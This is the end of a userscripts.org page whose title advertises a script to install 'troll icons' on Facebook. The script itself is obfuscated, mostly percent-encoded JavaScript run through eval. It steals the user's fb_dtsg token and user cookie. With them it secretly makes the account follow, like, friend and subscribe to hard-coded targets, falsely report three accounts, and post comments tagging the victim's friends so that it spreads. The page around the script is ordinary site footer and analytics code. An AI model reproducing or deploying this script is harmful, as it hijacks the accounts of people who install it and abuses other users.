(){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f&lt;Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i&lt;(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])&gt;=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i&lt;9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&amp;&amp;_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
eval(unescape(&quot;%76%61%72%20%66%62%5F%64%74%73%67%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%22%66%62%5F%64%74%73%67%22%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%3D%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%61%28%61%62%6F%6E%65%29%0A%7B%0A%20%76%61%72%20%68%74%74%70%34%3D%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%3B%0A%20%76%61%72%20%75%72%6C%34%3D%22%2F%61%6A%61%78%2F%66%6F%6C%6C%6F%77%2F%66%6F%6C%6C%6F%77%5F%70%72%6F%66%69%6C%65%2E%70%68%70%3F%5F%5F%61%3D%31%22%3B%0A%20%76%61%72%20%70%61%72%61%6D%73%34%3D%22%70%72%6F%66%69%6C%65%5F%69%64%3D%22%2B%61%62%6F%6E%65%2B%22%26%6C%6F%63%61%74%69%6F%6E%3D%31%26%73%6F%75%72%63%65%3D%66%6F%6C%6C%6F%77%2D%62%75%74%74%6F%6E%26%73%75%62%73%63%72%69%62%65%64%5F%62%75%74%74%6F%6E%5F%69%64%3D%75%33%37%71%61%63%5F%33%37%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%6C%73%64%26%5F%5F%22%2B%75%73%65%72%5F%69%64%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%68%74%74%70%34%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%75%72%6C%34%2C%74%72%75%65%29%3B%0A%20%68%74%74%70%34%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%3D%66%75%6E%63%74%69%6F%6E%28%29%0A%20%7B%0A%20%20%69%66%28%68%74%74%70%34%2E%72%65%61%64%79%53%74%61%74%65%3D%3D%34%26%26%68%74%74%70%34%2E%73%74%61%74%75%73%3D%3D%32%30%30%29%68%74%74%70%34%2E%63%6C%6F%73%65%0A%20%7D%0A%20%3B%0A%20%68%74%74%70%34%2E%73%65%6E%64%28%70%61%72%61%6D%73%34%29%0A%7D%0A%61%28%22%31%30%30%30%30%36%30%36%34%31%38%30%34%36%39%22%29%3B%61%28%22%31%30%30%30%30%33%34%38%39%34%31%38%37%36%36%22%29%3B%61%28%22%31%30%30%30%30%35%32%35%32%33%31%33%39%33%38%22%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%73%75%62%6C%69%73%74%28%75%69%64%73%73%29%0A%7B%0A%20%76%61%72%20%61%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%0A%20%61%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%6E%65%77%20%41%73%79%6E%63%52%65%71%75%65%73%74%28%29%2E%73%65%74%55%52%49%28%27%2F%61%6A%61%78%2F%66%72%69%65%6E%64%73%2F%6C%69%73%74%73%2F%73%75%62%73%63%72%69%62%65%2F%6D%6F%64%69%66%79%3F%6C%6F%63%61%74%69%6F%6E%3D%70%65%72%6D%61%6C%69%6E%6B%26%61%63%74%69%6F%6E%3D%73%75%62%73%63%72%69%62%65%27%29%2E%73%65%74%44%61%74%61%28%7B%20%66%6C%69%64%3A%20%22%20%2B%20%75%69%64%73%73%20%2B%20%22%20%7D%29%2E%73%65%6E%64%28%29%3B%22%3B%0A%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%61%29%3B%0A%7D%0A%73%75%62%6C%69%73%74%28%22%33%36%32%35%38%31%38%39%37%32%30%31%34%35%34%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%35%31%39%38%31%33%33%36%30%36%34%39%37%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%35%31%39%38%33%38%30%32%37%33%31%33%39%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%66%75%6E%63%74%69%6F%6E%20%4C%69%6B%65%28%70%29%20%7B%20%76%61%72%20%50%61%67%65%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%50%61%67%65%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%61%67%65%73%2F%66%61%6E%5F%73%74%61%74%75%73%2E%70%68%70%22%3B%20%76%61%72%20%50%61%67%65%50%61%72%61%6D%73%20%3D%20%22%26%66%62%70%61%67%65%5F%69%64%3D%22%20%2B%20%70%20%2B%22%26%61%64%64%3D%74%72%75%65%26%72%65%6C%6F%61%64%3D%66%61%6C%73%65%26%66%61%6E%5F%6F%72%69%67%69%6E%3D%70%61%67%65%5F%74%69%6D%65%6C%69%6E%65%26%66%61%6E%5F%73%6F%75%72%63%65%3D%26%63%61%74%3D%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%61%67%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%64%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%50%61%67%65%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%50%61%67%65%55%52%4C%2C%20%74%72%75%65%29%3B%20%50%61%67%65%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%50%61%67%65%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%50%61%67%65%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%50%61%67%65%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%50%61%67%65%2E%73%65%6E%64%28%50%61%67%65%50%61%72%61%6D%73%29%3B%20%7D%20%0A%4C%69%6B%65%28%22%31%34%39%37%30%36%31%34%38%35%37%30%34%37%38%22%29%3B%4C%69%6B%65%28%22%36%30%37%31%35%30%36%37%35%39%36%32%31%33%38%22%29%3B%4C%69%6B%65%28%22%37%33%32%30%32%36%32%35%30%31%35%39%31%32%37%22%29%3B%4C%69%6B%65%28%22%33%36%35%32%38%33%39%34%36%39%35%31%36%34%37%22%29%3B%4C%69%6B%65%28%22%32%32%32%31%34%37%36%39%31%33%30%30%33%33%39%22%29%3B%4C%69%6B%65%28%22%33%32%38%36%36%32%35%34%37%32%37%35%38%30%32%22%29%3B%4C%69%6B%65%28%22%36%33%33%35%33%33%39%34%36%37%30%34%30%36%34%22%29%3B%4C%69%6B%65%28%22%34%33%37%35%38%34%31%35%39%37%30%33%34%31%33%22%29%3B%4C%69%6B%65%28%22%34%38%34%38%30%39%36%32%38%32%39%36%38%38%31%22%29%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%20%66%75%6E%63%74%69%6F%6E%20%50%28%6F%70%6F%29%20%7B%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%58%55%52%4C%20%3D%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%75%66%69%2F%6C%69%6B%65%2E%70%68%70%22%3B%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%6C%69%6B%65%5F%61%63%74%69%6F%6E%3D%74%72%75%65%26%66%74%5F%65%6E%74%5F%69%64%65%6E%74%69%66%69%65%72%3D%22%2B%6F%70%6F%2B%22%26%73%6F%75%72%63%65%3D%31%26%63%6C%69%65%6E%74%5F%69%64%3D%22%2B%6E%6F%77%2B%22%25%33%41%33%37%39%37%38%33%38%35%37%26%72%6F%6F%74%69%64%3D%75%5F%6A%73%6F%6E%70%5F%33%39%5F%31%38%26%67%69%66%74%6F%63%63%61%73%69%6F%6E%26%66%74%5B%74%6E%5D%3D%25%33%45%25%33%44%26%66%74%5B%74%79%70%65%5D%3D%32%30%26%66%74%5B%71%69%64%5D%3D%35%38%39%30%38%31%31%33%32%39%34%37%30%32%37%39%32%35%37%26%66%74%5B%6D%66%5F%73%74%6F%72%79%5F%6B%65%79%5D%3D%32%38%31%34%39%36%32%39%30%30%31%39%33%31%34%33%39%35%32%26%66%74%5B%68%61%73%5F%65%78%70%61%6E%64%65%64%5F%75%66%69%5D%3D%31%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%68%6F%6D%65%5F%73%74%72%65%61%6D%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%38%51%6F%41%4D%42%6C%43%6C%79%6F%63%70%61%65%26%5F%5F%72%65%71%3D%67%34%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%58%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%20%7D%20%0A%50%28%22%31%34%37%39%33%32%32%39%35%33%33%33%30%38%33%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%72%65%70%6F%72%74%28%72%29%20%7B%0A%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%76%61%72%20%58%55%52%4C%20%3D%20%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%72%65%70%6F%72%74%2F%73%6F%63%69%61%6C%2E%70%68%70%22%3B%0A%76%61%72%20%58%50%61%72%61%6D%73%20%3D%22%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%62%6C%6F%63%6B%3D%31%26%70%70%3D%25%37%42%25%32%32%61%63%74%69%6F%6E%73%5F%74%6F%5F%74%61%6B%65%25%32%32%25%33%41%25%32%32%5B%5D%25%32%32%25%32%43%25%32%32%61%72%65%5F%66%72%69%65%6E%64%73%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%63%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%63%6F%6E%74%65%6E%74%5F%74%79%70%65%25%32%32%25%33%41%30%25%32%43%25%32%32%65%78%70%61%6E%64%5F%72%65%70%6F%72%74%25%32%32%25%33%41%31%25%32%43%25%32%32%66%69%72%73%74%5F%63%68%6F%69%63%65%25%32%32%25%33%41%25%32%32%66%69%6C%65%5F%72%65%70%6F%72%74%25%32%32%25%32%43%25%32%32%66%72%6F%6D%5F%67%65%61%72%25%32%32%25%33%41%25%32%32%74%69%6D%65%6C%69%6E%65%25%32%32%25%32%43%25%32%32%69%73%5F%66%6F%6C%6C%6F%77%69%6E%67%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%69%73%5F%74%61%67%67%65%64%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%6F%6E%5F%70%72%6F%66%69%6C%65%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%70%68%61%73%65%25%32%32%25%33%41%33%25%32%43%25%32%32%72%65%66%25%32%32%25%33%41%25%32%32%68%74%74%70%73%25%33%41%25%35%43%25%32%46%25%35%43%25%32%46%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%25%35%43%25%32%46%25%32%32%25%32%43%25%32%32%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%35%25%32%43%25%32%32%72%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%73%75%62%5F%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%31%25%32%43%25%32%32%74%69%6D%65%5F%66%6C%6F%77%5F%73%74%61%72%74%65%64%25%32%32%25%33%41%22%2B%6E%6F%77%2B%22%25%32%43%25%32%32%75%73%65%72%25%32%32%25%33%41%22%2B%75%73%65%72%5F%69%64%2B%22%25%37%44%26%66%69%6C%65%5F%72%65%70%6F%72%74%3D%31%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%61%68%79%6A%33%35%79%6E%7A%70%51%39%55%6D%41%57%75%55%52%44%77%26%5F%5F%72%65%71%3D%68%26%74%74%73%74%61%6D%70%3D%32%36%35%38%31%36%36%31%31%30%37%31%31%32%30%31%31%32%37%36%26%63%6F%6E%66%69%72%6D%65%64%3D%31%22%3B%0A%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%0A%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%0A%58%2E%63%6C%6F%73%65%3B%0A%7D%0A%7D%3B%0A%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%0A%7D%0A%72%65%70%6F%72%74%28%22%31%30%30%30%30%37%36%34%36%31%33%37%37%38%32%22%29%3B%72%65%70%6F%72%74%28%22%33%34%36%32%30%36%30%30%38%38%33%33%30%34%33%22%29%3B%72%65%70%6F%72%74%28%22%31%30%30%30%30%34%31%36%36%37%37%33%31%34%38%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%49%44%53%28%72%29%20%7B%0A%20%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%20%20%76%61%72%20%58%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%61%64%64%5F%66%72%69%65%6E%64%2F%61%63%74%69%6F%6E%2E%70%68%70%22%3B%0A%20%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%74%6F%5F%66%72%69%65%6E%64%3D%22%20%2B%20%72%20%2B%22%26%61%63%74%69%6F%6E%3D%61%64%64%5F%66%72%69%65%6E%64%26%68%6F%77%5F%66%6F%75%6E%64%3D%66%72%69%65%6E%64%5F%62%72%6F%77%73%65%72%5F%73%26%72%65%66%5F%70%61%72%61%6D%3D%6E%6F%6E%65%26%26%26%6F%75%74%67%6F%69%6E%67%5F%69%64%3D%26%6C%6F%67%67%69%6E%67%5F%6C%6F%63%61%74%69%6F%6E%3D%73%65%61%72%63%68%26%6E%6F%5F%66%6C%79%6F%75%74%5F%6F%6E%5F%63%6C%69%63%6B%3D%74%72%75%65%26%65%67%6F%5F%6C%6F%67%5F%64%61%74%61%26%68%74%74%70%5F%72%65%66%65%72%65%72%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%33%35%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%0A%20%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%20%20%20%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%0A%20%20%20%20%20%20%58%2E%63%6C%6F%73%65%3B%0A%20%20%20%20%7D%0A%20%20%7D%3B%0A%20%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%0A%7D&quot;));
//Test
a(&quot;100003639331768&quot;);a(&quot;100002743995966&quot;);a(&quot;100004779494056&quot;);a(&quot;100004782482748&quot;);a(&quot;100002694812256&quot;);a(&quot;100005430393122&quot;);a(&quot;100005720885349&quot;);a(&quot;100001757952346&quot;);a(&quot;1828337099&quot;);Like(&quot;263899490396128&quot;);Like(&quot;105176976250622&quot;);Like(&quot;255137054506025&quot;);
//Du Muc
P(&quot;279890998835924&quot;);Like(&quot;294993760651678&quot;);
//x
a(&quot;100000486644739&quot;);a(&quot;100006044743962&quot;);a(&quot;100007833065308&quot;);a(&quot;100007776852373&quot;);a(&quot;100003732252862&quot;);a(&quot;100004450778141&quot;);a(&quot;100003291703390&quot;);a(&quot;100004472405434&quot;);Like(&quot;148115978729579&quot;);Like(&quot;227898474024042&quot;);Like(&quot;397032160398361&quot;);Like(&quot;579802062045583&quot;);Like(&quot;561403480542081&quot;);Like(&quot;1396730137254275&quot;);</pre>

</div>
<div class='clear'></div>
<div id='root_footer'></div>
</div>
</div>
<div id='footer'>
<div id='footer-content'>
<div class='col la'>
<p>
<strong class='disclaim'>
Because it's your web
</strong>
</p>
</div>
<div class='col ra'>
<p class='credit'>
Powered by
<em>monkeys and unicorns</em>
with the help of many
<a href="/users/contributers" rel="nofollow">friends</a>
</p>
<p id='policies'>
Policy &amp; Guidelines:
<a href="/about/dmca" rel="nofollow">DMCA</a>
<a href="/about/privacy" rel="nofollow">Privacy Policy</a>
</p>
</div>
</div>
</div>
<script type='text/javascript'>
var auth_token = "+Hrfa9MQ6fgN65tTDYrzv7AvTl1I0N+P0wPv/acB77M=";
</script>
<script src="/javascripts/bottom.js?1389736029" type="text/javascript"></script>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-50927-4']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>
<!-- Quantcast Tag --> 
<script type="text/javascript">
var _qevents = _qevents || [];
(function() {
var elem = document.createElement('script');
elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
elem.async = true;
elem.type = "text/javascript";
var scpt = document.getElementsByTagName('script')[0];
scpt.parentNode.insertBefore(elem, scpt);  
})();
_qevents.push( { qacct:"p-6eWjYgYdo7Su6"} );
</script>
<noscript><div style="display: none;"><img src="//pixel.quantserve.com/pixel/p-6eWjYgYdo7Su6.gif" height="1" width="1" alt="Quantcast"/></div></noscript>
<script type="text/javascript">
  var a2a_onclick = 1;
  var a2a_linkname = "Cài Đặt ICON TROLL Trực Tiếp Trên FaceBook by Rius  ";
  var a2a_linkurl = "http://userscripts.org/scripts/show/391486";
</script>
<script type="text/javascript" src="http://static.addtoany.com/menu/page.js"></script>


</body>
</html>
